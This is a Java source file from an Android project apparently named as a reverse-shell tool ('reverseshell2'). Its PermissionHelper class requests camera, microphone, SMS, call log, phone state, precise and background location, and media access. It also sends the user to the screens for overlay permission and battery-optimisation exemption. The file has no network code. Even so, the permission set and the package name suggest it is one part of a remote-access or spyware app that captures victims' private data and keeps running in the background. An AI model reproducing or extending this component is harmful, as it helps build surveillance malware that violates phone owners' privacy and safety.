package com.example.reverseshell2;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

/**
 * Requests runtime and special permissions needed on Android 6 through 15+.
 */
public final class PermissionHelper {

    private static final int REQ_RUNTIME = 9911;
    private static final int REQ_BACKGROUND_LOCATION = 9912;
    private static Runnable sOnRuntimeDone;
    private static Runnable sOnBackgroundLocationDone;

    private PermissionHelper() {
    }

    public static void requestAll(Activity activity, Runnable onComplete) {
        requestRuntimeBatch(activity, () -> requestBackgroundLocationBatch(activity, () -> {
            requestOverlayIfNeeded(activity);
            requestIgnoreBatteryOptimizations(activity);
            onComplete.run();
        }));
    }

    public static void onRequestPermissionsResult(int requestCode) {
        if (requestCode == REQ_RUNTIME && sOnRuntimeDone != null) {
            Runnable done = sOnRuntimeDone;
            sOnRuntimeDone = null;
            done.run();
        } else if (requestCode == REQ_BACKGROUND_LOCATION && sOnBackgroundLocationDone != null) {
            Runnable done = sOnBackgroundLocationDone;
            sOnBackgroundLocationDone = null;
            done.run();
        }
    }

    private static void requestBackgroundLocationBatch(Activity activity, Runnable onDone) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
            onDone.run();
            return;
        }
        if (ContextCompat.checkSelfPermission(activity, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                == PackageManager.PERMISSION_GRANTED) {
            onDone.run();
            return;
        }
        if (ContextCompat.checkSelfPermission(activity, Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
            onDone.run();
            return;
        }
        sOnBackgroundLocationDone = onDone;
        ActivityCompat.requestPermissions(
                activity,
                new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION},
                REQ_BACKGROUND_LOCATION);
    }

    private static void requestRuntimeBatch(Activity activity, Runnable onDone) {
        List<String> permissions = buildRuntimePermissionList();
        List<String> toRequest = new ArrayList<>();
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(activity, permission)
                    != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(permission);
            }
        }
        if (toRequest.isEmpty()) {
            onDone.run();
            return;
        }
        sOnRuntimeDone = onDone;
        ActivityCompat.requestPermissions(
                activity, toRequest.toArray(new String[0]), REQ_RUNTIME);
    }

    private static List<String> buildRuntimePermissionList() {
        List<String> permissions = new ArrayList<>();
        permissions.add(Manifest.permission.CAMERA);
        permissions.add(Manifest.permission.RECORD_AUDIO);
        permissions.add(Manifest.permission.READ_SMS);
        permissions.add(Manifest.permission.READ_CALL_LOG);
        permissions.add(Manifest.permission.READ_PHONE_STATE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            permissions.add(Manifest.permission.READ_PHONE_NUMBERS);
        }
        permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
        permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES);
            permissions.add(Manifest.permission.READ_MEDIA_VIDEO);
            permissions.add(Manifest.permission.READ_MEDIA_AUDIO);
            permissions.add(Manifest.permission.POST_NOTIFICATIONS);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                permissions.add(Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED);
            }
        } else {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
                permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
            }
        }
        return permissions;
    }

    private static void requestOverlayIfNeeded(Activity activity) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                && !Settings.canDrawOverlays(activity)) {
            try {
                Intent intent = new Intent(
                        Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + activity.getPackageName()));
                activity.startActivity(intent);
            } catch (Exception ignored) {
            }
        }
    }

    private static void requestIgnoreBatteryOptimizations(Activity activity) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            return;
        }
        PowerManager pm = (PowerManager) activity.getSystemService(Activity.POWER_SERVICE);
        if (pm == null || pm.isIgnoringBatteryOptimizations(activity.getPackageName())) {
            return;
        }
        try {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + activity.getPackageName()));
            activity.startActivity(intent);
        } catch (Exception ignored) {
        }
    }
}
